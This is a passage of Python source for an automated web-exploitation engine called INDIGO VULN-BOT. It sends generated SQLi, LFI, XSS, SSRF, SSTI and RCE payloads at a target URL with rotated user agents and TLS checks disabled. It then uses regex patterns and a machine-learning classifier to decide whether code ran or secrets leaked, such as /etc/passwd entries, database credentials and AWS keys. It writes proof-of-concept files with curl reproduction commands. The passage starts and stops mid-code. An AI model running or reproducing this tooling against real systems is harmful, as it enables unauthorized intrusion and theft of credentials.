        features.append(len(words))
        features.append(len(set(words)) / max(len(words), 1))  # Vocabulary diversity

        # Special character ratios
        total_chars = max(len(response_text), 1)
        features.append(sum(1 for c in response_text if c.isalpha()) / total_chars)
        features.append(sum(1 for c in response_text if c.isdigit()) / total_chars)
        features.append(sum(1 for c in response_text if not c.isalnum() and not c.isspace()) / total_chars)

        # Line length statistics
        lines = response_text.split('\n')
        line_lengths = [len(l) for l in lines]
        features.append(sum(line_lengths) / max(len(line_lengths), 1))  # avg line length
        features.append(max(line_lengths) if line_lengths else 0)  # max line length

        # Colon and equals count (common in execution output)
        features.append(response_text.count(':'))
        features.append(response_text.count('='))

        return features

    def analyze_response(
        self,
        response_text: str,
        status_code: int,
        vuln_type: str,
        original_payload: str
    ) -> ResponseAnalysis:
        """
        Analyze response using ML + heuristic rules.

        Returns ResponseAnalysis with classification:
        - EXECUTION_OUTPUT: Code executed, returned output (NOT raw HTML)
        - RAW_HTML: Normal HTML page
        - BLOCKED: WAF/firewall blocked
        - ERROR_PAGE: Server error
        - PARTIAL_EXECUTION: Some execution evidence
        - DATA_EXTRACTION: Sensitive data leaked
        """
        # Rule-based classification first
        rule_result = self._rule_based_classify(response_text, status_code, vuln_type, original_payload)

        # ML classification
        ml_result = self._ml_classify(response_text, status_code)

        # Combine results
        if ml_result and ml_result["confidence"] > self.config["ml_confidence_threshold"]:
            final_class = ml_result["class"]
            final_confidence = ml_result["confidence"]
        else:
            final_class = rule_result["class"]
            final_confidence = rule_result["confidence"]

        # Extract execution evidence
        evidence = self._extract_execution_evidence(response_text, vuln_type)

        # Build output snippet
        output_snippet = self._build_output_snippet(response_text, final_class, vuln_type)

        # Response fingerprint
        fingerprint = hashlib.md5(response_text[:1000].encode()).hexdigest()

        return ResponseAnalysis(
            response_class=final_class,
            confidence=final_confidence,
            execution_evidence=evidence,
            raw_html_detected=(final_class == ResponseClass.RAW_HTML),
            blocked_detected=(final_class == ResponseClass.BLOCKED),
            output_snippet=output_snippet,
            response_fingerprint=fingerprint,
            comparison_baseline={
                "baseline_similarity": self._compute_baseline_similarity(response_text),
                "rule_confidence": rule_result["confidence"],
                "ml_confidence": ml_result["confidence"] if ml_result else 0.0,
            },
            details={
                "status_code": status_code,
                "response_length": len(response_text),
                "vuln_type": vuln_type,
                "payload_length": len(original_payload),
            }
        )

    def _rule_based_classify(
        self,
        response_text: str,
        status_code: int,
        vuln_type: str,
        original_payload: str
    ) -> Dict[str, Any]:
        """Rule-based response classification."""
        result = {
            "class": ResponseClass.UNKNOWN,
            "confidence": 0.0,
            "evidence": []
        }

        # Check BLOCKED first
        for pattern in BLOCKED_INDICATORS:
            if re.search(pattern, response_text, re.IGNORECASE):
                result["class"] = ResponseClass.BLOCKED
                result["confidence"] = 0.90
                result["evidence"].append(f"Blocked pattern: {pattern}")
                return result

        # Check ERROR
        for pattern in ERROR_INDICATORS:
            if re.search(pattern, response_text, re.IGNORECASE):
                result["class"] = ResponseClass.ERROR_PAGE
                result["confidence"] = 0.80
                result["evidence"].append(f"Error pattern: {pattern}")
                return result

        # Check EXECUTION patterns
        exec_matches = []
        vuln_patterns = EXECUTION_PATTERNS.get(f"rce_linux", [])
        vuln_patterns += EXECUTION_PATTERNS.get(f"rce_windows", [])

        # Add vuln-type specific patterns
        type_key = {
            "sqli": "sqli_output",
            "lfi": "lfi_output",
            "xss": "xss_execution",
            "ssrf": "ssrf_output",
            "ssti": "ssti_output",
            "rce": "rce_linux",
        }.get(vuln_type, "rce_linux")

        vuln_patterns += EXECUTION_PATTERNS.get(type_key, [])

        for pattern in vuln_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                exec_matches.append(match.group(0))

        if exec_matches:
            # Check if it's NOT just raw HTML
            html_score = sum(1 for p in RAW_HTML_INDICATORS
                           if re.search(p, response_text, re.IGNORECASE))

            if html_score < 3:  # Not primarily HTML
                result["class"] = ResponseClass.EXECUTION_OUTPUT
                result["confidence"] = 0.85 + (0.05 * min(len(exec_matches), 3))
                result["evidence"] = exec_matches[:5]
                return result
            else:
                # Has execution patterns but also HTML
                result["class"] = ResponseClass.PARTIAL_EXECUTION
                result["confidence"] = 0.60
                result["evidence"] = exec_matches[:5]
                return result

        # Check DATA EXTRACTION
        data_patterns = [
            r"root:[x*]:0:0:",
            r"DB_HOST|DB_NAME|DB_USER",
            r"APP_KEY|APP_SECRET",
            r"AccessKeyId|SecretAccessKey",
        ]
        for pattern in data_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                result["class"] = ResponseClass.DATA_EXTRACTION
                result["confidence"] = 0.85
                result["evidence"].append(f"Data pattern: {pattern}")
                return result

        # Check RAW HTML
        html_score = sum(1 for p in RAW_HTML_INDICATORS
                        if re.search(p, response_text, re.IGNORECASE))
        if html_score >= 3:
            result["class"] = ResponseClass.RAW_HTML
            result["confidence"] = 0.70 + (0.05 * min(html_score, 6))
            result["evidence"].append(f"HTML indicators: {html_score}")
            return result

        # Check REDIRECT
        if status_code in [301, 302, 303, 307, 308]:
            result["class"] = ResponseClass.REDIRECT
            result["confidence"] = 0.80
            return result

        # Default: unknown
        result["class"] = ResponseClass.UNKNOWN
        result["confidence"] = 0.30
        return result

    def _ml_classify(self, response_text: str, status_code: int) -> Optional[Dict]:
        """ML-based response classification."""
        if not self.trained or not HAS_SKLEARN:
            return None

        try:
            features = self.extract_features(response_text, status_code)
            features_scaled = self.scaler.transform([features])
            proba = self.model.predict_proba(features_scaled)[0]
            predicted_class = self.model.predict(features_scaled)[0]

            class_map = {
                0: ResponseClass.EXECUTION_OUTPUT,
                1: ResponseClass.RAW_HTML,
                2: ResponseClass.BLOCKED,
                3: ResponseClass.ERROR_PAGE,
                4: ResponseClass.PARTIAL_EXECUTION,
                5: ResponseClass.DATA_EXTRACTION,
            }

            return {
                "class": class_map.get(predicted_class, ResponseClass.UNKNOWN),
                "confidence": float(max(proba)),
                "probabilities": {class_map.get(i, ResponseClass.UNKNOWN).value: float(p)
                                 for i, p in enumerate(proba) if i in class_map}
            }
        except:
            return None

    def add_training_sample(
        self,
        response_text: str,
        status_code: int,
        label: ResponseClass
    ):
        """Add training sample for ML model."""
        features = self.extract_features(response_text, status_code)
        label_map = {
            ResponseClass.EXECUTION_OUTPUT: 0,
            ResponseClass.RAW_HTML: 1,
            ResponseClass.BLOCKED: 2,
            ResponseClass.ERROR_PAGE: 3,
            ResponseClass.PARTIAL_EXECUTION: 4,
            ResponseClass.DATA_EXTRACTION: 5,
        }
        self.training_data.append(features)
        self.training_labels.append(label_map.get(label, 0))

        if len(self.training_data) >= self.config["ml_training_samples"]:
            self.train()

    def train(self):
        """Train ML model."""
        if not HAS_SKLEARN:
            return
        if len(self.training_data) < 20:
            return

        try:
            X = np.array(self.training_data)
            y = np.array(self.training_labels)

            # Scale features
            X_scaled = self.scaler.fit_transform(X)

            # Split
            X_train, X_test, y_train, y_test = train_test_split(
                X_scaled, y, test_size=0.2, random_state=42
            )

            # Train Gradient Boosting
            self.model = GradientBoostingClassifier(
                n_estimators=100,
                max_depth=8,
                learning_rate=0.1,
                random_state=42
            )
            self.model.fit(X_train, y_train)

            # Evaluate
            y_pred = self.model.predict(X_test)
            accuracy = accuracy_score(y_test, y_pred)

            self.trained = True
            self._save_model()

            print(f"  [OK] ML model trained! Accuracy: {accuracy:.2%}")
        except Exception as e:
            print(f"  [!] ML training failed: {e}")

    def _extract_execution_evidence(self, response_text: str, vuln_type: str) -> List[str]:
        """Extract execution evidence from response."""
        evidence = []

        # Check all execution patterns
        for category, patterns in EXECUTION_PATTERNS.items():
            for pattern in patterns:
                matches = re.findall(pattern, response_text, re.IGNORECASE)
                for match in matches[:3]:
                    evidence.append(match[:200])

        return evidence[:10]

    def _build_output_snippet(
        self,
        response_text: str,
        response_class: ResponseClass,
        vuln_type: str
    ) -> str:
        """Build human-readable output snippet."""
        if response_class == ResponseClass.EXECUTION_OUTPUT:
            # Extract the actual execution output
            # Remove HTML tags
            clean = re.sub(r'<[^>]+>', '', response_text)
            # Get first meaningful lines
            lines = [l.strip() for l in clean.split('\n') if l.strip()]

            # Filter out common HTML artifacts
            meaningful = []
            for line in lines:
                if len(line) > 2 and not line.startswith('{') and not line.startswith('//'):
                    meaningful.append(line)

            if meaningful:
                return "\n".join(meaningful[:5])
            return response_text[:300]

        elif response_class == ResponseClass.DATA_EXTRACTION:
            # Extract sensitive data
            for pattern in [r"root:[x*]:0:0:.*", r"DB_\w+=.*", r"APP_\w+=.*"]:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    return match.group(0)[:200]

        elif response_class == ResponseClass.BLOCKED:
            for pattern in BLOCKED_INDICATORS:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    return f"BLOCKED: {match.group(0)[:100]}"

        return response_text[:200]


# ============================================================
# HTTP TESTER
# ============================================================
class VulnBotHTTPTester:
    """HTTP tester untuk VULN-BOT."""

    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Mobile/15E148",
    ]

    def __init__(self, config: Dict):
        self.config = config
        self.session = self._create_session()
        self.request_count = 0
        self.last_request_time = 0

    def _create_session(self):
        if not HAS_REQUESTS:
            return None
        session = req_lib.Session()
        retry = Retry(total=2, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def _get_headers(self) -> Dict[str, str]:
        return {
            "User-Agent": random.choice(self.USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        }

    def _wait_rate_limit(self):
        min_interval = 1.0 / self.config["rate_limit"]
        elapsed = time.time() - self.last_request_time
        if elapsed < min_interval:
            delay = min_interval - elapsed
            if self.config.get("randomize_delay"):
                delay += random.uniform(0, 0.5)
            time.sleep(delay)
        self.last_request_time = time.time()

    def test_payload(
        self,
        payload: str,
        target_url: str,
        param: str = "test",
        method: str = "GET"
    ) -> Dict[str, Any]:
        """Test single payload and return raw response data."""
        self._wait_rate_limit()
        self.request_count += 1

        result = {
            "status_code": 0,
            "response_text": "",
            "response_time_ms": 0.0,
            "response_size": 0,
            "response_headers": {},
            "error": None,
        }

        if not self.session:
            result["error"] = "requests not available"
            return result

        try:
            headers = self._get_headers()
            start_time = time.time()

            if method.upper() == "GET":
                response = self.session.get(
                    target_url,
                    params={param: payload},
                    headers=headers,
                    timeout=self.config["timeout_per_test"],
                    verify=False,
                    allow_redirects=True
                )
            elif method.upper() == "POST":
                response = self.session.post(
                    target_url,
                    data={param: payload},
                    headers=headers,
                    timeout=self.config["timeout_per_test"],
                    verify=False,
                    allow_redirects=True
                )
            else:
                # PUT, DELETE, etc.
                response = self.session.request(
                    method.upper(),
                    target_url,
                    data={param: payload},
                    headers=headers,
                    timeout=self.config["timeout_per_test"],
                    verify=False,
                    allow_redirects=True
                )

            elapsed_ms = (time.time() - start_time) * 1000

            result["status_code"] = response.status_code
            result["response_text"] = response.text
            result["response_time_ms"] = elapsed_ms
            result["response_size"] = len(response.text)
            result["response_headers"] = dict(response.headers)

        except Exception as e:
            result["error"] = str(e)

        return result

    def collect_baseline(
        self,
        target_url: str,
        param: str = "test",
        count: int = 3
    ) -> List[str]:
        """Collect baseline responses (normal requests without payload)."""
        baselines = []
        for _ in range(count):
            result = self.test_payload("normal_input_123", target_url, param, "GET")
            if result["status_code"] > 0:
                baselines.append(result["response_text"])
        return baselines


# ============================================================
# STATISTICAL ANALYZER
# ============================================================
class VulnBotStatAnalyzer:
    """Statistical analysis untuk VULN-BOT results."""

    def __init__(self, config: Dict):
        self.config = config

    def analyze(self, results: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Analyze statistical properties of test results."""
        if not results:
            return {"error": "No results"}

        analysis = {}

        # Success/failure counts
        successes = [r for r in results if r.get("execution_success")]
        analysis["total_tests"] = len(results)
        analysis["successful_tests"] = len(successes)
        analysis["success_rate"] = len(successes) / len(results) if results else 0.0

        # Response class distribution
        class_dist = Counter(r.get("response_class", "unknown") for r in results)
        analysis["response_class_distribution"] = dict(class_dist)

        # Complexity effectiveness
        complexity_stats = defaultdict(lambda: {"total": 0, "success": 0})
        for r in results:
            comp = r.get("payload_complexity", "unknown")
            complexity_stats[comp]["total"] += 1
            if r.get("execution_success"):
                complexity_stats[comp]["success"] += 1

        analysis["complexity_effectiveness"] = {
            comp: {
                "total": stats["total"],
                "success": stats["success"],
                "success_rate": stats["success"] / stats["total"] if stats["total"] > 0 else 0.0
            }
            for comp, stats in complexity_stats.items()
        }

        # Response time analysis
        if HAS_NUMPY:
            times = [r.get("response_time_ms", 0) for r in results if r.get("response_time_ms", 0) > 0]
            if times:
                analysis["response_time_mean"] = float(np.mean(times))
                analysis["response_time_std"] = float(np.std(times))
                analysis["response_time_median"] = float(np.median(times))

                # Compare success vs failure times
                success_times = [r.get("response_time_ms", 0) for r in successes if r.get("response_time_ms", 0) > 0]
                failure_times = [r.get("response_time_ms", 0) for r in results
                                if not r.get("execution_success") and r.get("response_time_ms", 0) > 0]

                if success_times and failure_times:
                    analysis["success_time_mean"] = float(np.mean(success_times))
                    analysis["failure_time_mean"] = float(np.mean(failure_times))

                    if HAS_SCIPY and len(success_times) >= 3 and len(failure_times) >= 3:
                        t_stat, p_value = scipy_stats.ttest_ind(success_times, failure_times)
                        analysis["time_difference_p_value"] = float(p_value)
                        analysis["time_difference_significant"] = p_value < 0.05

        # Technique effectiveness
        technique_stats = defaultdict(lambda: {"total": 0, "success": 0})
        for r in results:
            for tech in r.get("techniques", []):
                technique_stats[tech]["total"] += 1
                if r.get("execution_success"):
                    technique_stats[tech]["success"] += 1

        analysis["technique_effectiveness"] = {
            tech: {
                "total": stats["total"],
                "success": stats["success"],
                "success_rate": stats["success"] / stats["total"] if stats["total"] > 0 else 0.0
            }
            for tech, stats in technique_stats.items()
        }

        # Confidence interval
        if HAS_SCIPY and len(results) >= 10:
            success_rate = analysis["success_rate"]
            n = len(results)
            z = scipy_stats.norm.ppf(1 - (1 - 0.95) / 2)
            margin = z * math.sqrt(success_rate * (1 - success_rate) / n)
            analysis["confidence_interval_95"] = {
                "lower": max(0.0, success_rate - margin),
                "upper": min(1.0, success_rate + margin)
            }

        return analysis


# ============================================================
# MAIN VULN-BOT ENGINE
# ============================================================
class VulnBotEngine:
    """Main VULN-BOT engine."""

    def __init__(self, config: Dict = None):
        self.config = config or VULN_BOT_CONFIG
        self.payload_gen = MultiLayerPayloadGenerator(self.config)
        self.ml_analyzer = MLResponseAnalyzer(self.config)
        self.http_tester = VulnBotHTTPTester(self.config)
        self.stat_analyzer = VulnBotStatAnalyzer(self.config)

        os.makedirs(self.config["output_dir"], exist_ok=True)

    def process_finding(self, finding: Dict[str, Any]) -> VulnBotResult:
        """Process single finding with multi-layer payloads and ML analysis."""
        print(f"\n\033[33m{'='*58}")
        print(f"  VULN-BOT: {finding.get('name', 'Unknown')}")
        print(f"  Type: {finding.get('vuln_type', 'unknown')} | "
              f"Severity: {finding.get('severity', 'unknown')}")
        print(f"{'='*58}\033[0m")

        vuln_type = finding.get("vuln_type", "unknown").lower()
        target_url = finding.get("url", "")
        param = finding.get("context", {}).get("parameter", "test")
        context = {
            "waf_detected": finding.get("waf_detected", False),
            "technologies": finding.get("technologies", []),
        }

        # Collect baseline
        print(f"\n  [*] Collecting baseline responses...")
        baselines = self.http_tester.collect_baseline(target_url, param, self.config["baseline_requests"])
        for bl in baselines:
            self.ml_analyzer.collect_baseline(bl)
        print(f"  [OK] {len(baselines)} baseline(s) collected")

        # Generate multi-layer payloads
        print(f"\n  [*] Generating multi-layer payloads...")
        payloads = self.payload_gen.generate_all_payloads(
            vuln_type, context,
            max_total=self.config["max_payloads_per_finding"]
        )
        print(f"  [OK] Generated {len(payloads)} payloads")

        # Print complexity distribution
        comp_dist = Counter(p.complexity.value for p in payloads)
        for comp, count in sorted(comp_dist.items()):
            print(f"      {comp}: {count}")

        # Randomize order
        if self.config["randomize_order"]:
            random.shuffle(payloads)

        # Test payloads
        print(f"\n  [*] Testing payloads with ML analysis...")
        all_results = []
        successful_results = []
        validated_count = 0

        for i, payload in enumerate(payloads, 1):
            # Progress indicator
            payload_preview = payload.payload[:40].replace('\n', ' ')
            complexity_tag = payload.complexity.value.upper()
            print(f"\r    [{i}/{len(payloads)}] [{complexity_tag}] {payload_preview}...",
                  end='', flush=True)

            # Test payload
            test_result = self.http_tester.test_payload(
                payload.payload, target_url, param
            )

            if test_result["error"]:
                print(f" [ERR]", end='', flush=True)
                all_results.append({
                    "payload_complexity": payload.complexity.value,
                    "techniques": [t.value for t in payload.techniques],
                    "error": test_result["error"],
                    "execution_success": False,
                    "response_class": "error",
                })
                continue

            # ML Response Analysis
            response_analysis = self.ml_analyzer.analyze_response(
                test_result["response_text"],
                test_result["status_code"],
                vuln_type,
                payload.payload
            )

            # Determine if execution was successful
            execution_success = response_analysis.response_class in [
                ResponseClass.EXECUTION_OUTPUT,
                ResponseClass.DATA_EXTRACTION,
                ResponseClass.PARTIAL_EXECUTION,
            ]

            if execution_success:
                validated_count += 1

            # Add to ML training
            self.ml_analyzer.add_training_sample(
                test_result["response_text"],
                test_result["status_code"],
                response_analysis.response_class
            )

            # Build result record
            result_record = {
                "payload": payload.payload[:200],
                "payload_complexity": payload.complexity.value,
                "payload_length": len(payload.payload),
                "techniques": [t.value for t in payload.techniques],
                "encoding_chain": payload.encoding_chain,
                "layers": payload.layers,
                "status_code": test_result["status_code"],
                "response_time_ms": test_result["response_time_ms"],
                "response_size": test_result["response_size"],
                "execution_success": execution_success,
                "response_class": response_analysis.response_class.value,
                "ml_confidence": response_analysis.confidence,
                "execution_evidence": response_analysis.execution_evidence[:3],
                "output_snippet": response_analysis.output_snippet[:200],
                "raw_html_detected": response_analysis.raw_html_detected,
                "blocked_detected": response_analysis.blocked_detected,
                "fingerprint": response_analysis.response_fingerprint,
            }

            all_results.append(result_record)

            if execution_success:
                successful_results.append(result_record)

                # Print execution result
                print(f"\n    \033[32m[EXECUTION SUCCESS]\033[0m")
                print(f"    Class: {response_analysis.response_class.value}")
                print(f"    Confidence: {response_analysis.confidence:.2%}")

                if not response_analysis.raw_html_detected:
                    print(f"    \033[1;32m[!] Code execution is successful, does NOT return raw HTML output\033[0m")
                    print(f"    Output: {response_analysis.output_snippet[:150]}")
                else:
                    print(f"    [!] Partial execution (mixed with HTML)")

                if response_analysis.execution_evidence:
                    print(f"    Evidence: {response_analysis.execution_evidence[0][:100]}")
            else:
                # Print status inline
                status_map = {
                    ResponseClass.RAW_HTML: "HTML",
                    ResponseClass.BLOCKED: "BLOCKED",
                    ResponseClass.ERROR_PAGE: "ERROR",
                    ResponseClass.REDIRECT: "REDIRECT",
                    ResponseClass.UNKNOWN: "UNK",
                }
                status_tag = status_map.get(response_analysis.response_class, "UNK")
                print(f" [{status_tag}]", end='', flush=True)

            # Delay
            time.sleep(self.config["delay_between_tests"])

        print(f"\n\n  [OK] Tested {len(all_results)} payloads")
        print(f"  [OK] Validated (execution success): {validated_count}")

        # Find best payload
        best_payload = None
        best_response = None
        if successful_results:
            # Sort by confidence
            successful_results.sort(key=lambda r: r["ml_confidence"], reverse=True)
            best_result = successful_results[0]

            # Find matching payload
            for p in payloads:
                if p.payload[:200] == best_result["payload"]:
                    best_payload = p
                    break

            # Build best response
            best_response = ResponseAnalysis(
                response_class=ResponseClass(best_result["response_class"]),
                confidence=best_result["ml_confidence"],
                execution_evidence=best_result["execution_evidence"],
                raw_html_detected=best_result["raw_html_detected"],
                blocked_detected=best_result["blocked_detected"],
                output_snippet=best_result["output_snippet"],
                response_fingerprint=best_result["fingerprint"],
            )

        # Statistical analysis
        print(f"\n  [*] Statistical analysis...")
        stats = self.stat_analyzer.analyze(all_results)

        # Generate recommendations
        recommendations = self._generate_recommendations(stats, successful_results)

        # Generate PoC
        poc_files = []
        if self.config["save_poc"] and successful_results:
            poc_files = self._generate_poc(finding, successful_results, target_url, param)

        # Build result
        result = VulnBotResult(
            finding=finding,
            payloads_generated=len(payloads),
            payloads_tested=len(all_results),
            payloads_validated=validated_count,
            best_payload=best_payload,
            best_response=best_response,
            all_results=all_results,
            poc_files=poc_files,
            ml_analysis={
                "model_trained": self.ml_analyzer.trained,
                "training_samples": len(self.ml_analyzer.training_data),
            },
            statistical_analysis=stats,
            recommendations=recommendations,
        )

        # Print summary
        self._print_summary(result)

        return result

    def _generate_recommendations(
        self,
        stats: Dict,
        successful: List[Dict]
    ) -> List[str]:
        """Generate recommendations."""
        recs = []

        success_rate = stats.get("success_rate", 0.0)

        if success_rate == 0.0:
            recs.append("No execution success. Try:")
            recs.append("  - Different payload types")
            recs.append("  - Increase encoding chain depth")
            recs.append("  - Check if target is vulnerable")
        elif success_rate < 0.1:
            recs.append(f"Low success rate ({success_rate:.1%}). Focus on successful payload types.")
        elif success_rate > 0.5:
            recs.append(f"High success rate ({success_rate:.1%}). Vulnerability confirmed!")

        # Best complexity
        comp_eff = stats.get("complexity_effectiveness", {})
        if comp_eff:
            best_comp = max(comp_eff.items(), key=lambda x: x[1]["success_rate"])
            if best_comp[1]["success_rate"] > 0:
                recs.append(f"Best complexity: {best_comp[0]} ({best_comp[1]['success_rate']:.0%} success)")

        # Best technique
        tech_eff = stats.get("technique_effectiveness", {})
        if tech_eff:
            best_tech = max(tech_eff.items(), key=lambda x: x[1]["success_rate"])
            if best_tech[1]["success_rate"] > 0:
                recs.append(f"Best technique: {best_tech[0]} ({best_tech[1]['success_rate']:.0%} success)")

        # Time analysis
        if stats.get("time_difference_significant"):
            recs.append("Response time differs significantly between success/failure (timing attack possible)")

        return recs

    def _generate_poc(
        self,
        finding: Dict,
        successful: List[Dict],
        target_url: str,
        param: str
    ) -> List[str]:
        """Generate PoC files for successful payloads."""
        poc_files = []
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        vuln_type = finding.get("vuln_type", "unknown")

        for i, result in enumerate(successful[:5], 1):
            filename = f"poc_{vuln_type}_{ts}_{i}.txt"
            filepath = os.path.join(self.config["output_dir"], filename)

            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(f"{'='*60}\n")
                f.write(f"  INDIGO VULN-BOT v3.0 - PROOF OF CONCEPT\n")
                f.write(f"{'='*60}\n\n")
                f.write(f"Vulnerability: {finding.get('name', 'Unknown')}\n")
                f.write(f"Type: {vuln_type}\n")
                f.write(f"Severity: {finding.get('severity', 'Unknown')}\n")
                f.write(f"Target: {target_url}\n")
                f.write(f"Parameter: {param}\n")
                f.write(f"Date: {datetime.now().isoformat()}\n\n")

                f.write(f"--- PAYLOAD ---\n")
                f.write(f"Complexity: {result.get('payload_complexity', 'unknown')}\n")
                f.write(f"Length: {result.get('payload_length', 0)}\n")
                f.write(f"Techniques: {', '.join(result.get('techniques', []))}\n")
                f.write(f"Encoding Chain: {', '.join(result.get('encoding_chain', []))}\n")
                f.write(f"Layers: {', '.join(result.get('layers', []))}\n\n")
                f.write(f"Payload:\n{result.get('payload', '')}\n\n")

                f.write(f"--- RESPONSE ---\n")
                f.write(f"Status: {result.get('status_code', 0)}\n")
                f.write(f"Response Time: {result.get('response_time_ms', 0):.1f}ms\n")
                f.write(f"Response Class: {result.get('response_class', 'unknown')}\n")
                f.write(f"ML Confidence: {result.get('ml_confidence', 0):.2%}\n\n")

                f.write(f"--- EXECUTION EVIDENCE ---\n")
                if not result.get("raw_html_detected", False):
                    f.write(f"STATUS: Code execution is successful, does NOT return raw HTML output\n\n")
                else:
                    f.write(f"STATUS: Partial execution (mixed with HTML)\n\n")

                for ev in result.get("execution_evidence", []):
                    f.write(f"  Evidence: {ev}\n")

                f.write(f"\nOutput:\n{result.get('output_snippet', '')}\n")

                # curl command
                f.write(f"\n--- REPRODUCTION ---\n")
                payload_encoded = quote(result.get('payload', ''))
                f.write(f"curl -G '{target_url}' --data-urlencode '{param}={payload_encoded}'\n")

            poc_files.append(filepath)

        return poc_files

    def _print_summary(self, result: VulnBotResult):
        """Print result summary."""
        print(f"\n\033[32m{'='*58}")
        print(f"  VULN-BOT RESULT SUMMARY")
        print(f"{'='*58}\033[0m")
        print(f"  Finding: {result.finding.get('name', 'Unknown')}")
        print(f"  Payloads Generated: {result.payloads_generated}")
        print(f"  Payloads Tested: {result.payloads_tested}")
        print(f"  Payloads Validated: {result.payloads_validated}")

        if result.payloads_tested > 0:
            rate = result.payloads_validated / result.payloads_tested
            print(f"  Validation Rate: {rate:.1%}")

        if result.best_payload:
            print(f"\n  Best Payload:")
            print(f"    Complexity: {result.best_payload.complexity.value}")
            print(f"    Length: {len(result.best_payload.payload)} chars")
            print(f"    Techniques: {', '.join(t.value for t in result.best_payload.techniques)}")

        if result.best_response:
            print(f"\n  Response Analysis:")
            print(f"    Class: {result.best_response.response_class.value}")
            print(f"    Confidence: {result.best_response.confidence:.2%}")

            if not result.best_response.raw_html_detected:
                print(f"    \033[1;32m[!] Code execution is successful, does NOT return raw HTML output\033[0m")
                print(f"    Output: {result.best_response.output_snippet[:150]}")
            else:
                print(f"    [!] Partial execution (mixed with HTML)")

        # Complexity breakdown
        comp_eff = result.statistical_analysis.get("complexity_effectiveness", {})
        if comp_eff:
            print(f"\n  Complexity Effectiveness:")
            for comp, stats in sorted(comp_eff.items()):
                print(f"    {comp}: {stats['success']}/{stats['total']} "
                      f"({stats['success_rate']:.0%})")

        # Recommendations
        if result.recommendations:
            print(f"\n  Recommendations:")
            for rec in result.recommendations:
                print(f"    {rec}")

    def process_multiple_findings(self, findings: List[Dict]) -> List[VulnBotResult]:
        """Process multiple findings."""
        print(f"\n\033[1;36m{'='*60}")
        print(f"  INDIGO VULN-BOT v3.0 - Multi-Layer AI Payload Engine")
        print(f"  Processing {len(findings)} findings")
        print(f"{'='*60}\033[0m")

        results = []
        for i, finding in enumerate(findings, 1):
            print(f"\n\033[36m[{i}/{len(findings)}]\033[0m")
            result = self.process_finding(finding)
            results.append(result)

        # Final summary
        self._print_final_summary(results)

        return results

    def _print_final_summary(self, results: List[VulnBotResult]):
        """Print final summary."""
        print(f"\n\033[1;32m{'='*60}")
        print(f"  VULN-BOT v3.0 - FINAL SUMMARY")
        print(f"{'='*60}\033[0m")

        total_gen = sum(r.payloads_generated for r in results)
        total_tested = sum(r.payloads_tested for r in results)
        total_validated = sum(r.payloads_validated for r in results)

        print(f"  Total Findings: {len(results)}")
        print(f"  Total Payloads Generated: {total_gen}")
        print(f"  Total Payloads Tested: {total_tested}")
        print(f"  Total Payloads Validated: {total_validated}")

        if total_tested > 0:
            print(f"  Overall Validation Rate: {total_validated/total_tested:.1%}")

        print(f"\n  Per-Finding Results:")
        for r in results:
            vt = r.finding.get("vuln_type", "unknown").upper()
            status = "EXEC" if r.payloads_validated > 0 else "FAIL"
            rate = r.payloads_validated / r.payloads_tested if r.payloads_tested > 0 else 0

            if r.best_response and not r.best_response.raw_html_detected and r.payloads_validated > 0:
                exec_note = " (Code execution confirmed, NOT raw HTML)"
            else:
                exec_note = ""

            print(f"    [{status}] {vt:<10} | "
                  f"Validated: {r.payloads_validated}/{r.payloads_tested} | "
                  f"Rate: {rate:.0%}{exec_note}")

        # Payload generation stats
        gen_stats = self.payload_gen.get_stats()
        if gen_stats:
            print(f"\n  Payload Generation Stats:")
            for comp, count in sorted(gen_stats.items()):
                print(f"    {comp}: {count}")

    def save_results(self, results: List[VulnBotResult], filename: str = None):
        """Save results to JSON."""
        if not filename:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"vuln_bot_results_{ts}.json"

        filepath = os.path.join(self.config["output_dir"], filename)

        data = []
        for r in results:
            data.append({
                "finding": r.finding,
                "payloads_generated": r.payloads_generated,
                "payloads_tested": r.payloads_tested,
                "payloads_validated": r.payloads_validated,
                "validation_rate": r.payloads_validated / r.payloads_tested if r.payloads_tested > 0 else 0.0,
                "best_payload": {
                    "payload": r.best_payload.payload[:200] if r.best_payload else None,
                    "complexity": r.best_payload.complexity.value if r.best_payload else None,
                    "techniques": [t.value for t in r.best_payload.techniques] if r.best_payload else [],
                    "layers": r.best_payload.layers if r.best_payload else [],
                } if r.best_payload else None,
                "best_response": {
                    "class": r.best_response.response_class.value if r.best_response else None,
                    "confidence": r.best_response.confidence if r.best_response else 0.0,
                    "execution_evidence": r.best_response.execution_evidence if r.best_response else [],
                    "raw_html_detected": r.best_response.raw_html_detected if r.best_response else False,
                    "output_snippet": r.best_response.output_snippet if r.best_response else "",
                    "execution_confirmed_not_html": (
                        r.best_response and
                        r.best_response.response_class == ResponseClass.EXECUTION_OUTPUT and
                        not r.best_response.raw_html_detected
                    ),
                } if r.best_response else None,
                "statistical_analysis": r.statistical_analysis,
                "ml_analysis": r.ml_analysis,
                "recommendations": r.recommendations,
                "poc_files": r.poc_files,
                "successful_payloads": [
                    {
                        "payload": sr["payload"],
                        "complexity": sr["payload_complexity"],
                        "techniques": sr["techniques"],
                        "response_class": sr["response_class"],
                        "ml_confidence": sr["ml_confidence"],
                        "execution_evidence": sr["execution_evidence"],
                        "output_snippet": sr["output_snippet"],
                        "raw_html_detected": sr["raw_html_detected"],
                    }
                    for sr in r.all_results if sr.get("execution_success")
                ],
            })

        with open(filepath, 'w', encoding='utf-8') as f:
